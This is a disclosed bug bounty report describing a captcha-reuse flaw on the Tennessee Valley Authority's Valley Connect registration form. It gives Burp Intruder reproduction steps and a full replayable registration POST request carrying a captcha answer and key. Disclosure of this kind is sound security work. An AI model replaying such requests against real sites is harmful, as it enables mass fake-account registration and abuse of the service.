# captcha bypass leads to register multiple user with one valid captcha

## Report Details
- **Report ID**: 2213366
- **URL**: https://hackerone.com/reports/2213366
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-10-17T17:08:10.003Z
- **Disclosed**: 2023-11-30T15:45:56.295Z

## Reporter
- **Username**: mohs3n
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: tennessee-valley-authority

## Vulnerability Information
## Summary:
Hi team,
when we register in valley connect, captcha now expire and we can use single valid captcha for register and call to many user.

## Steps To Reproduce:
1. go to login form : https://valleyconnect.tva.gov/registration
2. complete form and click on submit registration, then intercept request with burp
3. use intruder for call multiple request, we should replace email in every request.

```
POST /registration HTTP/2
Host: valleyconnect.tva.gov

UserName=admin&Password=jgn%25%5EThgf%23rfvHRESdy56tef&ConfirmPassword=jgn%25%5EThgf%23rfvHRESdy56tef&EmailAddress=E%40jetamooz.com&EmailAddressVerify=E%40jetamooz.com&FirstName=alex&LastName=jane&Initials=&Suffix=&JobTitle=it&OrganizationType=Business+Partner&OrganizationName=sarv&Country=792&StreetAddress=sary&City=katy&Province=titi&State=AL&ZipCode=&PhoneNumber=%28934%29+734-4364&MobilePhoneNumber=%28957%29+363-4655&TimeZone=America%2FLos_Angeles&CapAnswer=U4YIQ&CapKey=XXTxVOUWZrCz6buVtsgF2cFaPHLSCKVSRQc4z4My13Bee8JiTYVZXmiPd8zLSbMc&BeCheck=
```


## Supporting Material/References:

{F2781078}
{F2781077}
{F2781085}
{F2781080}

## Impact

we can bypass captcha and register too many user with one valid captcha

## Attachments
- Screenshot_from_2023-10-17_20-20-56.png
- Screenshot_from_2023-10-17_20-21-08.png
- Screenshot_from_2023-10-17_20-28-09.png
- Screenshot_from_2023-10-17_20-30-07.png
